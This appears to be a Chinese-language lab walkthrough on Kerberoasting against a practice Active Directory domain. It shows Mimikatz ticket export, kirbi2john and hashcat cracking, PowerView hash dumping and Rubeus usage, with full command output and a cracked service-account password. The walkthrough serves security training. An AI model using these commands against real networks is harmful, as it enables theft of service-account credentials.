<h2 id="使用-Mimikatz-从内存中提取票据"><a href="#使用-Mimikatz-从内存中提取票据" class="headerlink" title="使用 Mimikatz 从内存中提取票据"></a>使用 Mimikatz 从内存中提取票据</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Using &#x27;mimikatz.log&#x27; <span class="hljs-keyword">for</span> logfile : OK<br><br>mimikatz # base64 /out:true<br>isBase64InterceptInput  is false<br>isBase64InterceptOutput is true<br><br>mimikatz # kerberos::list /export  <br><br>&lt;SNIP&gt;<br><br>[<span class="hljs-number">00000002</span>] - <span class="hljs-number">0</span>x00000017 - rc4_hmac_nt      <br>   <span class="hljs-built_in">Start</span>/End/MaxRenew: <span class="hljs-number">2</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">36</span>:<span class="hljs-number">22</span> PM ; <span class="hljs-number">2</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> AM ; <span class="hljs-number">3</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> PM<br>   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:<span class="hljs-number">1433</span> @ INLANEFREIGHT.LOCAL<br>   Client Name       : htb-student @ INLANEFREIGHT.LOCAL<br>   Flags <span class="hljs-number">40</span>a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; <br>====================<br>Base64 of file : <span class="hljs-number">2</span>-<span class="hljs-number">40</span>a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~<span class="hljs-number">1433</span>-INLANEFREIGHT.LOCAL.kirbi<br>====================<br>doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO<br>....<br>====================<br><br>   * Saved to file     : <span class="hljs-number">2</span>-<span class="hljs-number">40</span>a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~<span class="hljs-number">1433</span>-INLANEFREIGHT.LOCAL.kirbi<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="准备用于破解的-Base64-Blob"><a href="#准备用于破解的-Base64-Blob" class="headerlink" title="准备用于破解的 Base64 Blob"></a>准备用于破解的 Base64 Blob</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;base64 blob&gt;&quot;</span> |  <span class="hljs-built_in">tr</span> -d \\n <br><br>doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIF....<br></code></pre></td></tr></table></figure>

<h3 id="将输出保存为-kirbi-文件"><a href="#将输出保存为-kirbi-文件" class="headerlink" title="将输出保存为 .kirbi 文件"></a>将输出保存为 .kirbi 文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ <span class="hljs-built_in">cat</span> encoded_file | <span class="hljs-built_in">base64</span> -d &gt; sqldev.kirbi<br></code></pre></td></tr></table></figure>

<h3 id="执行破解"><a href="#执行破解" class="headerlink" title="执行破解"></a>执行破解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sed <span class="hljs-string">&#x27;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#x27;</span> crack_file &gt; sqldev_tgs_hashcat<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ <span class="hljs-built_in">cat</span> sqldev_tgs_hashcat <br><br>$krb5tgs$23$*sqldev.kirbi*<span class="hljs-variable">$813149fb261</span>....<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt <br><br>&lt;SNIP&gt;<br><br>$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$....:database!<br>                                                 <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: Kerberos 5, etype 23, TGS-REP<br>Hash.Target......: $krb5tgs$23$*sqldev.kirbi*<span class="hljs-variable">$813149fb261549a6a1b4965e</span>...7feeab<br>Time.Started.....: Thu Feb 24 22:03:03 2022 (8 secs)<br>Time.Estimated...: Thu Feb 24 22:03:11 2022 (0 secs)<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:  1150.5 kH/s (9.76ms) @ Accel:64 Loops:1 Thr:64 Vec:8</span><br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 8773632/14344385 (61.16%)<br>Rejected.........: 0/8773632 (0.00%)<br>Restore.Point....: 8749056/14344385 (60.99%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br>Candidates.<span class="hljs-comment">#1....: davius -&gt; darjes</span><br><br>Started: Thu Feb 24 22:03:00 2022<br>Stopped: Thu Feb 24 22:03:11 2022<br></code></pre></td></tr></table></figure>

<h2 id="自动化-工具化路线"><a href="#自动化-工具化路线" class="headerlink" title="自动化&#x2F;工具化路线"></a>自动化&#x2F;工具化路线</h2><h3 id="使用-PowerView-提取-TGS-票据"><a href="#使用-PowerView-提取-TGS-票据" class="headerlink" title="使用 PowerView 提取 TGS 票据"></a>使用 PowerView 提取 TGS 票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Import-Module</span> .\PowerView.ps1<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> * <span class="hljs-literal">-spn</span> | <span class="hljs-built_in">select</span> samaccountname<br><br>samaccountname<br><span class="hljs-literal">--------------</span><br>adfs<br>backupagent<br>krbtgt<br>sqldev<br>sqlprod<br>sqlqa<br>solarwindsmonitor<br></code></pre></td></tr></table></figure>

<h3 id="使用-PowerView-针对特定用户"><a href="#使用-PowerView-针对特定用户" class="headerlink" title="使用 PowerView 针对特定用户"></a>使用 PowerView 针对特定用户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> sqldev | <span class="hljs-built_in">Get-DomainSPNTicket</span> <span class="hljs-literal">-Format</span> Hashcat<br><br>SamAccountName       : sqldev<br>DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>ServicePrincipalName : MSSQLSvc/DEV<span class="hljs-literal">-PRE-SQL</span>.inlanefreight.local:<span class="hljs-number">1433</span><br>TicketByteHexStream  :<br>Hash                 : <span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$23</span><span class="hljs-variable">$</span>*sqldev<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$MSSQLSvc</span>/DEV<span class="hljs-literal">-PRE-SQL</span>.inlanefreight.local:<span class="hljs-number">1433</span>*<span class="hljs-variable">$BF9729001</span><br>                       <span class="hljs-number">376</span>B63C5CAC933493C58CE7<br></code></pre></td></tr></table></figure>

<h3 id="导出所有票据到-CSV-文件"><a href="#导出所有票据到-CSV-文件" class="headerlink" title="导出所有票据到 CSV 文件"></a>导出所有票据到 CSV 文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> * <span class="hljs-literal">-SPN</span> | <span class="hljs-built_in">Get-DomainSPNTicket</span> <span class="hljs-literal">-Format</span> Hashcat | <span class="hljs-built_in">Export-Csv</span> .\ilfreight_tgs.csv <span class="hljs-literal">-NoTypeInformation</span><br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">cat</span> .\ilfreight_tgs.csv<br><br><span class="hljs-string">&quot;SamAccountName&quot;</span>,<span class="hljs-string">&quot;DistinguishedName&quot;</span>,<span class="hljs-string">&quot;ServicePrincipalName&quot;</span>,<span class="hljs-string">&quot;TicketByteHexStream&quot;</span>,<span class="hljs-string">&quot;Hash&quot;</span><br><span class="hljs-string">&quot;adfs&quot;</span>,<span class="hljs-string">&quot;CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span>,<span class="hljs-string">&quot;adfsconnect/azure01.inlanefreight.local&quot;</span>,,<span class="hljs-string">&quot;<span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$23</span><span class="hljs-variable">$</span>*adfs<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$adfsconnect</span>/azure01.inlanefreight.local*<span class="hljs-variable">$59C086008BBE7EAE4E483506632F6EF8</span><span class="hljs-variable">$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;SNIP&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="使用-Rubeus"><a href="#使用-Rubeus" class="headerlink" title="使用 Rubeus"></a>使用 Rubeus</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\Rubeus.exe<br><br>&lt;SNIP&gt;<br><br>Roasting:<br><br>    Perform Kerberoasting:<br>        Rubeus.exe kerberoast [[/<span class="hljs-type">spn</span>:<span class="hljs-string">&quot;blah/blah&quot;</span>] | [/<span class="hljs-type">spns</span>:<span class="hljs-type">C</span>:\<span class="hljs-type">temp</span>\<span class="hljs-type">spns.txt</span>]] [/<span class="hljs-type">user</span>:<span class="hljs-type">USER</span>] [/<span class="hljs-type">domain</span>:<span class="hljs-type">DOMAIN</span>] [/<span class="hljs-type">dc</span>:<span class="hljs-type">DOMAIN_CONTROLLER</span>] [/<span class="hljs-type">ou</span>:<span class="hljs-string">&quot;OU=,...&quot;</span>] [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br><br>    Perform Kerberoasting, outputting hashes to a file:<br>        Rubeus.exe kerberoast /outfile:hashes.txt [[/<span class="hljs-type">spn</span>:<span class="hljs-string">&quot;blah/blah&quot;</span>] | [/<span class="hljs-type">spns</span>:<span class="hljs-type">C</span>:\<span class="hljs-type">temp</span>\<span class="hljs-type">spns.txt</span>]] [/<span class="hljs-type">user</span>:<span class="hljs-type">USER</span>] [/<span class="hljs-type">domain</span>:<span class="hljs-type">DOMAIN</span>] [/<span class="hljs-type">dc</span>:<span class="hljs-type">DOMAIN_CONTROLLER</span>] [/<span class="hljs-type">ou</span>:<span class="hljs-string">&quot;OU=,...&quot;</span>] [/<span class="hljs-type">ldaps</span>]<br><br>    Perform Kerberoasting, outputting hashes <span class="hljs-keyword">in</span> the file output format, but to the console:<br>        Rubeus.exe kerberoast /simple [[/<span class="hljs-type">spn</span>:<span class="hljs-string">&quot;blah/blah&quot;</span>] | [/<span class="hljs-type">spns</span>:<span class="hljs-type">C</span>:\<span class="hljs-type">temp</span>\<span class="hljs-type">spns.txt</span>]] [/<span class="hljs-type">user</span>:<span class="hljs-type">USER</span>] [/<span class="hljs-type">domain</span>:<span class="hljs-type">DOMAIN</span>] [/<span class="hljs-type">dc</span>:<span class="hljs-type">DOMAIN_CONTROLLER</span>] [/<span class="hljs-type">ou</span>:<span class="hljs-string">&quot;OU=,...&quot;</span>] [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br><br>    Perform Kerberoasting with alternate credentials:<br>        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/<span class="hljs-type">spn</span>:<span class="hljs-string">&quot;blah/blah&quot;</span>] [/<span class="hljs-type">user</span>:<span class="hljs-type">USER</span>] [/<span class="hljs-type">domain</span>:<span class="hljs-type">DOMAIN</span>] [/<span class="hljs-type">dc</span>:<span class="hljs-type">DOMAIN_CONTROLLER</span>] [/<span class="hljs-type">ou</span>:<span class="hljs-string">&quot;OU=,...&quot;</span>] [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br><br>    Perform Kerberoasting with an existing TGT:<br>        Rubeus.exe kerberoast &lt;/spn:<span class="hljs-string">&quot;blah/blah&quot;</span> | /spns:C:\temp\spns.txt&gt; &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/<span class="hljs-type">nowrap</span>]<br><br>    Perform Kerberoasting with an existing TGT <span class="hljs-keyword">using</span> an enterprise principal:<br>        Rubeus.exe kerberoast &lt;/spn:user@domain.com | /spns:user1@domain.com,user2@domain.com&gt; /enterprise &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/<span class="hljs-type">nowrap</span>]<br><br>    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal <span class="hljs-keyword">if</span> any fail:<br>        Rubeus.exe kerberoast &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /autoenterprise [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br><br>    Perform Kerberoasting <span class="hljs-keyword">using</span> the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:<br>        Rubeus.exe kerberoast /usetgtdeleg [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br><br>    Perform <span class="hljs-string">&quot;opsec&quot;</span> Kerberoasting, <span class="hljs-keyword">using</span> tgtdeleg, and filtering out AES-enabled accounts:<br>        Rubeus.exe kerberoast /rc4opsec [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br><br>    List statistics about found Kerberoastable accounts without actually sending ticket requests:<br>        Rubeus.exe kerberoast /stats [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br><br>    Perform Kerberoasting, requesting tickets only <span class="hljs-keyword">for</span> accounts with an admin count of <span class="hljs-number">1</span> (custom LDAP <span class="hljs-keyword">filter</span>):<br>        Rubeus.exe kerberoast /ldapfilter:<span class="hljs-string">&#x27;admincount=1&#x27;</span> [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br><br>    Perform Kerberoasting, requesting tickets only <span class="hljs-keyword">for</span> accounts whose password was last <span class="hljs-built_in">set</span> between <span class="hljs-number">01</span><span class="hljs-literal">-31-2005</span> and <span class="hljs-number">03</span><span class="hljs-literal">-29-2010</span>, returning up to <span class="hljs-number">5</span> service tickets:<br>        Rubeus.exe kerberoast /pwdsetafter:<span class="hljs-number">01</span><span class="hljs-literal">-31-2005</span> /pwdsetbefore:<span class="hljs-number">03</span><span class="hljs-literal">-29-2010</span> /resultlimit:<span class="hljs-number">5</span> [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br><br>    Perform Kerberoasting, with a delay of <span class="hljs-number">5000</span> milliseconds and a jitter of <span class="hljs-number">30</span>%:<br>        Rubeus.exe kerberoast /delay:<span class="hljs-number">5000</span> /jitter:<span class="hljs-number">30</span> [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br><br>    Perform AES Kerberoasting:<br>        Rubeus.exe kerberoast /aes [/<span class="hljs-type">ldaps</span>] [/<span class="hljs-type">nowrap</span>]<br></code></pre></td></tr></table></figure>

<h3 id="使用-stats-标志"><a href="#使用-stats-标志" class="headerlink" title="使用 &#x2F;stats 标志"></a>使用 &#x2F;stats 标志</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\Rubeus.exe kerberoast /stats<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v2.<span class="hljs-number">0.2</span><br><br><br>[*] Action: Kerberoasting<br><br>[*] Listing statistics about target users, no ticket requests being performed.<br>[*] Target Domain          : INLANEFREIGHT.LOCAL<br>[*] Searching path <span class="hljs-string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span><br><br>[*] Total kerberoastable users : <span class="hljs-number">9</span><br><br><br> <span class="hljs-literal">------------------------------------------------------------</span><br> | Supported Encryption <span class="hljs-built_in">Type</span>                        | Count |<br> <span class="hljs-literal">------------------------------------------------------------</span><br> | RC4_HMAC_DEFAULT                                 | <span class="hljs-number">7</span>     |<br> | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | <span class="hljs-number">2</span>     |<br> <span class="hljs-literal">------------------------------------------------------------</span><br><br> <span class="hljs-literal">----------------------------------</span><br> | Password Last <span class="hljs-built_in">Set</span> Year | Count |<br> <span class="hljs-literal">----------------------------------</span><br> | <span class="hljs-number">2022</span>                   | <span class="hljs-number">9</span>     |<br> <span class="hljs-literal">----------------------------------</span><br></code></pre></td></tr></table></figure>

<h3 id="使用-nowrap-标志"><a href="#使用-nowrap-标志" class="headerlink" title="使用 &#x2F;nowrap 标志"></a>使用 &#x2F;nowrap 标志</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\Rubeus.exe kerberoast /ldapfilter:<span class="hljs-string">&#x27;admincount=1&#x27;</span> /nowrap<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v2.<span class="hljs-number">0.2</span><br><br><br>[*] Action: Kerberoasting<br><br>[*] NOTICE: AES hashes will be returned <span class="hljs-keyword">for</span> AES<span class="hljs-literal">-enabled</span> accounts.<br>[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="hljs-keyword">for</span> these accounts.<br><br>[*] Target Domain          : INLANEFREIGHT.LOCAL<br>[*] Searching path <span class="hljs-string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))&#x27;</span><br><br>[*] Total kerberoastable users : <span class="hljs-number">3</span><br><br><br>[*] SamAccountName         : backupagent<br>[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local<br>[*] PwdLastSet             : <span class="hljs-number">2</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">15</span>:<span class="hljs-number">40</span> PM<br>[*] Supported ETypes       : RC4_HMAC_DEFAULT<br>[*] Hash                   : <span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$23</span><span class="hljs-variable">$</span>*backupagent<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$backupjob</span>/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*<span class="hljs-variable">$750F377DEFA85A67EA0FE51B0B28F83D</span><span class="hljs-variable">$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266</span><br></code></pre></td></tr></table></figure>

<h3 id="检查支持的加密类型"><a href="#检查支持的加密类型" class="headerlink" title="检查支持的加密类型"></a>检查支持的加密类型</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> testspn <span class="hljs-literal">-Properties</span> samaccountname,serviceprincipalname,msds<span class="hljs-literal">-supportedencryptiontypes</span><br><br>serviceprincipalname                   msds<span class="hljs-literal">-supportedencryptiontypes</span> samaccountname<br><span class="hljs-literal">--------------------</span>                   <span class="hljs-literal">-----------------------------</span> <span class="hljs-literal">--------------</span><br>testspn/kerberoast.inlanefreight.local                            <span class="hljs-number">24</span> testspn<br></code></pre></td></tr></table></figure>

<h3 id="请求新票据"><a href="#请求新票据" class="headerlink" title="请求新票据"></a>请求新票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt;  .\Rubeus.exe kerberoast /user:testspn /nowrap<br><br>[*] Action: Kerberoasting<br><br>[*] NOTICE: AES hashes will be returned <span class="hljs-keyword">for</span> AES<span class="hljs-literal">-enabled</span> accounts.<br>[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="hljs-keyword">for</span> these accounts.<br><br>[*] Target User            : testspn<br>[*] Target Domain          : INLANEFREIGHT.LOCAL<br>[*] Searching path <span class="hljs-string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span><br><br>[*] Total kerberoastable users : <span class="hljs-number">1</span><br><br>[*] SamAccountName         : testspn<br>[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL<br>[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local<br>[*] PwdLastSet             : <span class="hljs-number">2</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">15</span>:<span class="hljs-number">43</span> PM<br>[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96<br>[*] Hash                   : <span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$18</span><span class="hljs-variable">$testspn</span><span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$</span>*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*<span class="hljs-variable">$8939F8C5B97A4</span><br></code></pre></td></tr></table></figure>

<p>要通过 Hashcat 运行此操作，我们需要使用哈希模式 <code>19700</code> ，根据 Hashcat 的 example_hashes 表，这是 <code>Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)</code> 。我们按如下方式运行 AES 哈希并检查状态，显示通过输入 <code>s</code> 查看破解作业状态，预计需要超过 23 分钟才能遍历整个 rockyou.txt 字典。</p>
